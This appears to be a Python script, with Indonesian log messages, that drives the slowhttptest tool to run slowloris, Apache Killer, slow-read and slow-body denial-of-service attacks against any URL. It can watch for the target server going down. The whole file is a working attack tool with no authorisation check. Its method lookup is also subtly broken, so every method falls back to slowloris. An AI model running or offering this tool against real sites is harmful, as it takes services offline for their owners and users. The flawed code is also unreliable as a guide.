import subprocess
import time
import requests
import logging

logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s] %(levelname)s: %(message)s')

def is_server_down(url):
    try:
        response = requests.get(url, timeout=5)
        return response.status_code >= 500
    except Exception:
        return True

def estimate_payload_size(url):
    try:
        res = requests.get(url)
        return len(res.content) // 1024  # dalam KB
    except:
        return 10

def run_dos_attack(url, requests_num=100, duration=10, packet_size=1024, header=None, method='slowloris', stop_on_down=False):
    method_map = {
        'slowloris': '-H',
        'apachekiller': '-R',
        'slowread': '-X',
        'slowbody': '-B'
    }
    attack_type = method_map.get(method.upper(), '-H')

    cmd = [
        'slowhttptest',
        '-c', str(requests_num),
        '-r', '200',
        '-l', str(duration),
        '-s', str(packet_size),
        '-u', url,
        attack_type,
        '-p', '3'
    ]

    if header:
        cmd += ['-j', f"{header}"]

    logging.info(f"Menjalankan DoS test dengan metode: {method.upper()} - Command: {' '.join(cmd)}")
    process = subprocess.Popen(cmd)

    if stop_on_down:
        logging.info("DoS akan dihentikan jika server tidak responsif.")
        time.sleep(5)
        while process.poll() is None:
            if is_server_down(url):
                process.terminate()
                return f"DoS dihentikan karena server tidak responsif (metode: {method})."
            time.sleep(2)

    process.wait()
    return f"DoS selesai tanpa membuat server down (metode: {method})."
